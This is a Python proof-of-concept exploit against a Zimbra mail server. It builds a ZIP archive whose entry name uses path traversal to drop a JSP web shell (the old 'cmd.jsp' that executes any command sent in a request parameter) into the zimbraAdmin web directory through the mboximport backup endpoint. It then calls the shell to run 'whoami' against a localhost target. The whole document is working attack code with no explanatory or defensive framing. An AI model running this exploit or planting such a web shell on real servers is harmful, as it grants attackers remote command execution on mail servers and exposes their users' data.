import requests
import zipfile
import io

JSP_SHELL = """<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream di = new DataInputStream(in);
        String disr = di.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = di.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
"""

def buildZip(jsp):
    zip_buffer = io.BytesIO()
    zf = zipfile.ZipFile(zip_buffer, 'w')
    zf.writestr('../../../../mailboxd/webapps/zimbraAdmin/shell.jsp', jsp)
    zf.close()
    return zip_buffer.getvalue()

def exploit(host, payload, cmd):
    headers = {'content-Type': 'application/x-www-form-urlencoded'}
    requests.post(host + '/service/extension/backup/mboximport?account-name=admin&account-status=1&ow=cmd', data=payload, headers=headers)
    requests.get(host + "/zimbraAdmin/shell.jsp?cmd=" + cmd)

def main():
    payload = buildZip(JSP_SHELL)
    exploit('http://localhost:9090', payload, 'whoami')

main()